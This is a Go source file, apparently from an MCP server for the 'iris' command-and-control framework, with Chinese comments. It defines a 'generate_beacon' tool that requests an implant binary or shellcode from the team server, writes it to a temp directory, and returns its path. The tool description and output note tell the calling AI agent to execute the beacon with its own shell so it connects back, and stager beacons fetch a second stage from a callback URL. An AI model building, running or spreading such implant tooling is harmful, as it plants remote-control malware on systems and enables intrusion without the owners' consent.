package mcp

import (
	"context"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	msdk "github.com/modelcontextprotocol/go-sdk/mcp"
)

// payloadDir 返回生成的载荷落地目录(%TEMP%/iris-mcp-payloads)。
func payloadDir() string { return filepath.Join(os.TempDir(), "iris-mcp-payloads") }

// generateHexKey 复刻 utils/listenerForm.ts generateEncryptKey:
// 16 随机字节的 hex(32 字符)。
func generateHexKey() (string, error) {
	buf := make([]byte, 16)
	if _, err := rand.Read(buf); err != nil {
		return "", err
	}
	return hex.EncodeToString(buf), nil
}

type generatePayloadIn struct {
	ListenerID string `json:"listener_id" jsonschema:"已启动监听器的 id(list_listeners 可查)"`
	OS         string `json:"os" jsonschema:"windows | linux | mac"`
	Arch       string `json:"arch" jsonschema:"amd64 | x86 | arm | arm64"`
	Format     string `json:"format" jsonschema:"exe | dll | bin | shellcode | c | elf | macho"`
	StageMode  string `json:"stage_mode,omitempty" jsonschema:"stagerless | stager"`
	BeaconType string `json:"beacon_type,omitempty" jsonschema:"c | go(stagerless go-beacon 场景必填)"`
}

type generatePayloadOut struct {
	Path      string `json:"path"`
	SHA256    string `json:"sha256"`
	Size      int64  `json:"size"`
	FileName  string `json:"file_name,omitempty"`
	Format    string `json:"format,omitempty"`
	StageMode string `json:"stage_mode,omitempty"`
	StageURL  string `json:"stage_url,omitempty"`
	Note      string `json:"note,omitempty"`
}

var allowedPayloadSets = map[string][]string{
	"os":          {"windows", "linux", "mac"},
	"arch":        {"amd64", "x86", "arm", "arm64"},
	"format":      {"exe", "dll", "bin", "shellcode", "c", "elf", "macho"},
	"stage_mode":  {"stagerless", "stager"},
	"beacon_type": {"c", "go"},
}

func registerPayloadTools(s *Server) {
	msdk.AddTool(s.srv, &msdk.Tool{
		Name: "generate_beacon",
		Description: "生成真实 beacon 二进制并落盘到本机 %TEMP%\\iris-mcp-payloads," +
			"返回绝对路径+sha256+大小——随后由 Agent 自己的 shell 执行它完成上线。" +
			"MCP 不提供进程执行工具。",
	}, func(ctx context.Context, req *msdk.CallToolRequest, in generatePayloadIn) (*msdk.CallToolResult, any, error) {
		for field, allowed := range allowedPayloadSets {
			v := map[string]string{
				"os": in.OS, "arch": in.Arch, "format": in.Format,
				"stage_mode": in.StageMode, "beacon_type": in.BeaconType,
			}[field]
			if v == "" {
				if field == "beacon_type" || field == "stage_mode" {
					continue
				}
				return nil, nil, fmt.Errorf("%s 必填(允许值: %s)", field, strings.Join(allowed, "|"))
			}
			if !containsFold(allowed, v) {
				return nil, nil, fmt.Errorf("%s 仅支持 %s,收到 %q", field, strings.Join(allowed, "|"), v)
			}
		}

		reqBody := map[string]any{
			"listener_id": in.ListenerID,
			"os":          strings.ToLower(in.OS),
			"arch":        strings.ToLower(in.Arch),
			"format":      strings.ToLower(in.Format),
		}
		if in.StageMode != "" {
			reqBody["stage_mode"] = strings.ToLower(in.StageMode)
		}
		if in.BeaconType != "" {
			reqBody["beacon_type"] = strings.ToLower(in.BeaconType)
		}

		_, data, err := s.ts.Do(ctx, "POST", "/api/v1/payload/generate", reqBody)
		if err != nil {
			return nil, nil, err
		}
		out, err := writePayloadArtifact(data, strings.ToLower(in.Format))
		if err != nil {
			return nil, nil, err
		}
		if out.StageURL == "" {
			out.Note = "二进制已落盘;用你的 shell 直接执行该路径即可上线。"
		} else {
			out.Note = "stager 载荷已就绪;beacon 将通过 stage_url 回连拉取二级。"
		}
		return textResult(out)
	})
}

func containsFold(list []string, v string) bool {
	for _, item := range list {
		if strings.EqualFold(item, v) {
			return true
		}
	}
	return false
}

// writePayloadArtifact 解码 base64 载荷、计算指纹并写入临时目录。
func writePayloadArtifact(data json.RawMessage, format string) (generatePayloadOut, error) {
	var resp struct {
		Payload   string `json:"payload"`
		Encoding  string `json:"encoding"`
		FileName  string `json:"file_name"`
		StageID   string `json:"stage_id"`
		StageURL  string `json:"stage_url"`
		StageMode string `json:"stage_mode"`
		Format    string `json:"format"`
	}
	if err := json.Unmarshal(data, &resp); err != nil {
		return generatePayloadOut{}, fmt.Errorf("解析载荷响应失败: %w (data=%s)", err, truncateJSON(data))
	}
	if resp.Encoding != "" && !strings.EqualFold(resp.Encoding, "base64") {
		return generatePayloadOut{}, fmt.Errorf("不支持载荷编码 %q", resp.Encoding)
	}
	blob, err := base64.StdEncoding.DecodeString(resp.Payload)
	if err != nil {
		return generatePayloadOut{}, fmt.Errorf("payload base64 解码失败: %w", err)
	}

	fileName := filepath.Base(strings.TrimSpace(resp.FileName))
	if fileName == "" || fileName == "." || fileName == "/" || fileName == `\` {
		fileName = "beacon_" + strconv.FormatInt(time.Now().UnixMilli(), 10)
		if format != "" {
			fileName += "." + format
		}
	}
	dir := payloadDir()
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return generatePayloadOut{}, fmt.Errorf("创建载荷目录失败: %w", err)
	}
	target := filepath.Join(dir, fmt.Sprintf("%d_%s", time.Now().UnixMilli(), fileName))
	if err := os.WriteFile(target, blob, 0o644); err != nil {
		return generatePayloadOut{}, fmt.Errorf("写载荷文件失败: %w", err)
	}
	sum := sha256.Sum256(blob)
	return generatePayloadOut{
		Path:      target,
		SHA256:    hex.EncodeToString(sum[:]),
		Size:      int64(len(blob)),
		FileName:  resp.FileName,
		Format:    firstNonEmpty(resp.Format, format),
		StageMode: resp.StageMode,
		StageURL:  resp.StageURL,
	}, nil
}

func truncateJSON(raw json.RawMessage) string {
	s := string(raw)
	if len(s) > 200 {
		s = s[:200] + "...(截断)"
	}
	return s
}
